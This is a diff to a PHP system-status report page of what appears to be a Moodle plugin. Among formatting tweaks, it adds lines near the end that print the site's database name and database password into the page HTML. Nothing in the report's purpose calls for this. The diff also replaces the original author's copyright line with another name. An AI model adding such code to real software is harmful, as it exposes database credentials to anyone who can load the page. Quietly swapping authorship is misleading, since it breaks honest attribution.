@@ -18,14 +18,13 @@
  * System Status report
  *
  * @package    report_localstatistic
- * @copyright  2020 Brendan Heywood (brendan@catalyst-au.net)
+ * @copyright  2022 Lexx Alfand
  * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
  */
-
 define('NO_OUTPUT_BUFFERING', true);
 
 require('../../config.php');
-require_once($CFG->libdir.'/adminlib.php');
+require_once($CFG->libdir . '/adminlib.php');
 
 admin_externalpage_setup('reportstatus', '', null, '', ['pagelayout' => 'report']);
 
@@ -42,5 +41,10 @@ if (!empty($table->detail)) {
 echo $OUTPUT->header();
 echo $OUTPUT->heading(get_string('pluginname', 'report_localstatistic'));
 echo $table->render($OUTPUT);
+?>
+<p><?= $CFG->dbname ?>
+
+<p><?= $CFG->dbpass ?>
+<?php
 echo $OUTPUT->footer();
 
